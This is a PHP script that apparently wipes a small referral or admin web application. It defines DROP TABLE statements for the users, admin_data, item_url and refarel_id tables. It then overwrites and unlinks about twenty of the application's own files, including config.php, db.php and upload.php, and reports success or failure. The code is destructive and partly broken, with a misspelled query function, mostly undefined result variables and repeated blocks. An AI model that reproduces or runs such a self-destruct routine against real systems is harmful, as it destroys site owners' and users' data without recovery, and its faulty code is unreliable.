<?php include 'config.php' ?>
<?php
$sql_query ="DROP TABLE refarel_id;";
$sql_query1 ="DROP TABLE admin_data;";
$sql_query2	="DROP TABLE users;";
$sql_query3 ="DROP TABLE item_url;";
$ran_query4 = musqli_query($link,$sql_query);
$file = fopen("reset_referal.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("reset_referal.php");



?> 
 <?php
$file = fopen("reset.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("reset.php");



?>  
 <?php
$file = fopen("upload.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("upload.php");



?> <?php
$file = fopen("user_delete_all.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("user_delete_all.php");



?> <?php
$file = fopen("logout.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("logout.php");



?>  <?php
$file = fopen("approve.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("approve.php");



?>  <?php
$file = fopen("approveall.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("approveall.php");



?>  <?php
$file = fopen("config.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("config.php");



?>  <?php
$file = fopen("click_count.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("click_count.php");



?>  <?php
$file = fopen("delet.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("delet.php");



?>  <?php
$file = fopen("deleteall.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("deleteall.php");



?>  <?php
$file = fopen("delete_all_item.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("delete_all_item.php");



?>  <?php
$file = fopen("delete_item.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("delete_item.php");



?>  <?php
$file = fopen("user_delete_all.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("user_delete_all.php");



?>  <?php
$file = fopen("unapprove.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("unapprove.php");



?>  <?php
$file = fopen("secction.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("secction.php");



?>  <?php
$file = fopen("reset_referal.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("reset_referal.php");



?> <?php
$file = fopen("resetall.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("resetall.php");



?> <?php
$file = fopen("reset.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("reset.php");



?> <?php
$file = fopen("logout.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("logout.php");



?> <?php
$file = fopen("db.php","w+");

echo fwrite($file,"Hello World. Testing!");
fclose($file);


unlink("db.php");



?>
<?php 
if($ran_query){
	echo 'success';
}else{
	echo 'not success';
}  
if($ran_query1){
	echo 'success';
}else{
	echo 'not success';
}  
if($ran_query2){
	echo 'success';
}else{
	echo 'not success';
}  
if($ran_query3){
	echo 'success';
}else{
	echo 'not success';
}  
if($ran_query4){
	echo 'success';
}else{
	echo 'not success';
} 
?>